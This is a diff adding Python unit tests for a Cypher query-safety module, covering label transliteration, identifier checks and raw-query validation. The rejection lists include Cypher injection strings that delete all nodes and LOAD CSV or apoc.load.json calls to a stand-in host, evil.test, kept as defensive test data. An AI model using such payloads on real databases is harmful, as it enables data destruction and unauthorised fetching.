@@ -37,6 +37,7 @@ from src.lib.cypher_safety import (
     clean_property_key,
     create_database_if_not_exists_query,
     create_database_query,
+    original_type_properties,
     quote_database_name,
     quote_identifier,
     quote_label,
@@ -70,11 +71,25 @@ class CypherSafetyHelperTests(unittest.TestCase):
             quote_rel_types_pattern(["knows", "likes"]), "`KNOWS`|`LIKES`"
         )
 
+    def test_clean_label_transliterates_non_ascii_types(self):
+        self.assertEqual(clean_label("CITTÀ"), "CITTA")
+        self.assertEqual(clean_label("città"), "CITTA")
+        self.assertEqual(clean_label("naïve"), "NAIVE")
+        mapped = clean_label("名前")
+        self.assertRegex(mapped, r"^U[a-f0-9]{16}$")
+        self.assertEqual(clean_label("名前"), mapped)
+        self.assertNotEqual(clean_label("名前"), clean_label("都市"))
+        self.assertEqual(quote_label("CITTÀ"), "`CITTA`")
+        self.assertEqual(
+            original_type_properties(["CITTÀ", "PERSON"]),
+            {"original_type": "CITTÀ"},
+        )
+        self.assertEqual(original_type_properties(["PERSON"]), {})
+
     def test_rejects_injection_shaped_identifiers(self):
         payloads = [
             "x`y",
             "a//b",
-            "名前",
             "'; MATCH (n) DETACH DELETE n //",
             "foo@DETACH DELETE n",
         ]
@@ -89,6 +104,7 @@ class CypherSafetyHelperTests(unittest.TestCase):
 
     def test_static_property_key_allowlist(self):
         self.assertEqual(static_property_key("description"), "description")
+        self.assertEqual(static_property_key("ingest_task_ids"), "ingest_task_ids")
         with self.assertRaises(InvalidCypherIdentifier):
             static_property_key("not_allowlisted")
 
@@ -116,19 +132,34 @@ class CypherSafetyHelperTests(unittest.TestCase):
             require_database_name("1abc")
         with self.assertRaises(InvalidCypherIdentifier):
             require_database_name("foo`bar")
+        for invalid in ("ab", "foo_", "foo.", "foo-", "foo_bar"):
+            with self.subTest(name=invalid):
+                with self.assertRaises(InvalidCypherIdentifier) as raised:
+                    require_database_name(invalid)
+                self.assertNotIn(repr(invalid), str(raised.exception))
 
     def test_validity_clauses_use_allowlisted_keys_and_parameters(self):
         valid_at = relationship_valid_at_clause("r", "as_of")
         self.assertIn("r['valid_from']", valid_at)
+        self.assertIn("r['valid_at']", valid_at)
         self.assertIn("r['valid_to']", valid_at)
         self.assertIn("$as_of", valid_at)
+        self.assertIn("IS NOT NULL", valid_at)
+        self.assertNotIn("r['valid_from'] IS NULL OR", valid_at)
         self.assertNotIn(";", valid_at)
         window = relationship_changed_in_window_clause("r", "since", "until")
+        self.assertTrue(window.startswith("(") and window.endswith(")"))
         self.assertIn("r['invalid_at']", window)
+        self.assertIn("r['recorded_at']", window)
+        self.assertIn("r['valid_at']", window)
+        self.assertIn("r['inserted_at']", window)
         self.assertIn("IS NOT NULL", window)
         self.assertNotIn("$since", window)
         self.assertNotIn("$until", window)
         self.assertNotIn(">=", window)
+        combined = window + " AND n['uuid'] IN $subject_uuids"
+        self.assertTrue(combined.startswith("("))
+        self.assertIn(") AND n['uuid'] IN $subject_uuids", combined)
         with self.assertRaises(InvalidCypherIdentifier):
             relationship_valid_at_clause("r`", "as_of")
         with self.assertRaises(InvalidCypherIdentifier):
@@ -182,11 +213,46 @@ class CypherSafetyHelperTests(unittest.TestCase):
             "CALL db.\nadmin.waitForIndexes() YIELD name RETURN name",
             "RETURN 1; MATCH (n) DETACH DELETE n",
             "",
+            "// just a comment",
+            "/* block only */",
+            "// x\rCALL dbms.components() YIELD name RETURN name",
+            "// x\r\nCALL dbms.components() YIELD name RETURN name",
         ]
         for query in rejected:
             with self.subTest(query=query):
                 with self.assertRaises(RawCypherRejected):
                     validate_raw_cypher(query)
+        self.assertEqual(
+            validate_raw_cypher("RETURN 1; // note"),
+            "RETURN 1",
+        )
+        self.assertEqual(
+            validate_raw_cypher("MATCH (n:`call dbms.metrics`) RETURN n"),
+            "MATCH (n:`call dbms.metrics`) RETURN n",
+        )
+
+    def test_validate_raw_cypher_rejects_load_csv_and_apoc(self):
+        rejected = [
+            "LOAD CSV FROM 'https://evil.test/x.csv' AS row RETURN row",
+            "LOAD CSV WITH HEADERS FROM 'file:///tmp/x.csv' AS row RETURN row",
+            "MATCH (n) LOAD /*x*/ CSV FROM 'https://evil.test/x.csv' AS row RETURN n",
+            "CALL apoc.load.json('https://evil.test') YIELD value RETURN value",
+            "CALL apoc.cypher.run('USE system RETURN 1', {}) YIELD value RETURN value",
+            "CALL `apoc`.load.json('https://evil.test') YIELD value RETURN value",
+            "CALL apoc/*x*/.load.json('https://evil.test') YIELD value RETURN value",
+        ]
+        for query in rejected:
+            with self.subTest(query=query):
+                with self.assertRaises(RawCypherRejected):
+                    validate_raw_cypher(query)
+        self.assertEqual(
+            validate_raw_cypher("RETURN 'LOAD CSV FROM https://evil.test' AS note"),
+            "RETURN 'LOAD CSV FROM https://evil.test' AS note",
+        )
+        self.assertEqual(
+            validate_raw_cypher("RETURN 'CALL apoc.load.json' AS note"),
+            "RETURN 'CALL apoc.load.json' AS note",
+        )
 
     def test_validate_raw_cypher_allows_empty_strings_and_db_labels(self):
         self.assertEqual(validate_raw_cypher("RETURN '' AS s"), "RETURN '' AS s")
